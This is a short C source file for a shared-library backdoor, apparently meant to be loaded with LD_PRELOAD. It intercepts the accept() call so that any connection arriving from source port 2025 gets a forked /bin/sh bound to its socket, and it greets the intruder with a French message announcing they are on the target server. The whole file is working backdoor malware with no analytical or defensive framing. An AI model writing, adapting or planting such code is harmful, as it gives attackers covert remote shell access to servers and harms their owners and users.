#define _GNU_SOURCE       // Needed for RTLD_NEXT
#include <stdio.h>        // Standard include
//#include <sys/types.h>    // Socket Stuff
#include <sys/socket.h>   // Socket Stuff
//#include <netinet/in.h>   // Socket Stuff
//#include <netdb.h>        // Socket Stuff
#include <arpa/inet.h>    // Socket Stuff
#include <unistd.h>       // for dup2(), execve(), fork()
#include <string.h>       // strlen()
#include <dlfcn.h>        // dlsym

static const unsigned short BACKDOOR_SRC_PORT = 2025;

static int (*real_accept)(int, struct sockaddr *, socklen_t *) = NULL;

void __attribute__((constructor)) backdoor_initalize() {
  real_accept = dlsym(RTLD_NEXT, "accept");
}

void backdoor(int client_sock_fd) {
    write(client_sock_fd, "Vous êtez sur le serveur cible\n", strlen("Vous êtez sur le serveur cible\n"));
    
    dup2(client_sock_fd, 0);
    dup2(client_sock_fd, 1);
    dup2(client_sock_fd, 2);
    
    execve("/bin/sh", 0, 0);
}

int accept(int sockfd, struct sockaddr *addr , socklen_t *addrLen) {
  int client_sock_fd = 0;
  struct sockaddr_in *addr_in = NULL;
  
  client_sock_fd = real_accept(sockfd, (struct sockaddr *) addr, addrLen);
  
  addr_in = (struct sockaddr_in *)addr;

  if (ntohs(addr_in->sin_port) == BACKDOOR_SRC_PORT) {
      if (fork() == 0) {
        backdoor(client_sock_fd);
      } else {
        close(client_sock_fd);
        return -1;
      }
  }

  return client_sock_fd;
  
}
